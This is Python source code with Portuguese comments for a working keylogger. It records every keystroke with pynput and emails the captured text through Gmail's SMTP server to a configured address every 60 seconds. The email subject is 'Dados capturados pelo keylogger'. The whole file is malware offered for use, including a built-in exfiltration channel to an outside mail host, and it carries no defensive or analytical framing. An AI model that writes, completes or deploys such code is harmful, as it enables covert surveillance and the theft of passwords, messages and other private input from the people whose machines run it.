#Código para Captura / Bliotecas / Import SMTP
from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
from threading import Timer

#Email de destino que deve ser criado via Google
log = ""

EMAIL_ORIGEM = ""
EMAIL_DESTINO = ""
SENHA_EMAIL = ""

#Função para enviar email atrvés do SMTP do Google
def enviar_email():
    global log
    if log:
        msg = MIMEText(log)
        msg['SUBJECT'] = "Dados capturados pelo keylogger"
        msg['From'] = EMAIL_ORIGEM
        msg['To'] = EMAIL_DESTINO
        
        try:
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login(EMAIL_ORIGEM, SENHA_EMAIL)
            server.send_message(msg)
            server.quit
        except Exception as e:
            print("Erro ao enviar", e)
        
    log = ""
    
    Timer(60, enviar_email).start()

#Teclas a serem ignoradas    
def on_press(key):
    global log
    try:
        log += key.char
    except AttributeError:
        if key == keyboard.Key.space:
             log += " "
        elif key == keyboard.Key.enter:
            log += "\n"
        elif key == keyboard.Key.tab:
            log +="\t"
        elif key == keyboard.Key.backspace:
           log += " "
        elif key == keyboard.Key.esc:
            log += " [ESC] "
        else:
            pass

#Execução do código        
with keyboard.Listener(on_press=on_press) as listener:
    enviar_email()
    listener.join()